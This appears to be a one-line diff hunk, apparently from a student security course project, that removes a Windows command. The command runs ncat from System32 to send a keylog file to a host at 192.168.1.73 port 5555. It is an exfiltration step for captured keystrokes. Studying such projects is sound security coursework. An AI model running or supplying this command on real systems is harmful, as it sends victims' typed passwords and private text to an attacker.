@@ -1,1 +1,0 @@
-C:\Windows\System32\COMP-8506-FINAL-PROJECT\ncat.exe --send-only 192.168.1.73 5555 < C:\Windows\System32\COMP-8506-FINAL-PROJECT\keylogs.txt
